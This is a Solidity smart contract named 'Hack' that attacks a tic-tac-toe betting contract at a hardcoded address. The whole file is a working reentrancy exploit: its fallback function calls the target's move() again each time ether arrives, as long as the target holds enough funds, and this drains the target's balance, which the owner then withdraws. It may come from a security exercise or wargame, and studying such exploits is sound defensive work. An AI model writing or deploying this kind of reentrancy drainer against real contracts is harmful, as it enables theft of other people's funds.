// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;


interface XOXContract {
    function startGame() external payable;
    function chooseGame(uint idx) external payable;
    function move(uint idx, uint pos) external returns(uint[9] memory);

}

contract Hack {

    address constant XOXAddress = 0x5AcDEBfA562CAf07D5bd508610B19F321867Ae36;
    uint constant gameCost = 0.001 ether;
    address immutable public owner;

    uint lastIdx;
    uint lastPos;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require( owner == msg.sender, "not owner" );
        _;
    }

    function startGame() external {
        XOXContract(XOXAddress).startGame{value: gameCost}();
    }

    function chooseGame( uint idx ) external {
        XOXContract(XOXAddress).chooseGame{value: gameCost}( idx );
    }

    function move( uint idx, uint pos ) external {
        lastIdx = idx;
        lastPos = pos;
        XOXContract(XOXAddress).move( idx, pos );
    }

    fallback() external payable {
        if( address( XOXAddress ).balance >= gameCost * 2 ) {
            XOXContract(XOXAddress).move( lastIdx, lastPos );
        } 
    }

    function deposit() external payable {
        
    }


    function withdraw() external onlyOwner {
        payable( owner ).transfer( address(this).balance );
    }

}